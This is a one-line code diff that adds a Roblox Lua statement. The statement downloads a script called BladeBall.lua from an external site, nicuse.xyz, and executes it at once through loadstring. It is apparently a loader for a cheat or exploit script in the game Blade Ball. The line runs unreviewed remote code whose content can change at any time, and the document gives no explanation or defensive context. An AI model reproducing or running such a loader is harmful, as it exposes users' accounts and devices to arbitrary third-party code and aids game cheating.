@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.nicuse.xyz/BladeBall.lua"))()
